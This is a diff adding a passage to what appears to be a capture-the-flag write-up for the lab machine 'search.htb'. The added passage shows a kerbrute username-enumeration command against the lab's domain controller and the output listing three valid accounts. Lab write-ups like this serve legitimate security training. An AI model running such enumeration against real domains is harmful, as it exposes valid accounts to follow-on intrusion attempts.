@@ -182,5 +182,24 @@ dsantiago
 ...[SNIP]...
 ```
 
+```python
+kerbrute userenum --dc research.search.htb -d search.htb potential-users.txt 
 
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 05/19/26 - Ronnie Flathers @ropnop
+
+2026/05/19 18:31:53 >  Using KDC(s):
+2026/05/19 18:31:53 >  	research.search.htb:88
+
+2026/05/19 18:31:53 >  [+] VALID USERNAME:	keely.lyons@search.htb
+2026/05/19 18:31:53 >  [+] VALID USERNAME:	dax.santiago@search.htb
+2026/05/19 18:31:53 >  [+] VALID USERNAME:	sierra.frye@search.htb
+2026/05/19 18:31:53 >  Done! Tested 116 usernames (3 valid) in 0.201 seconds
+```
+Kerbrute found 3 valid users, this also gives me a username foma
 
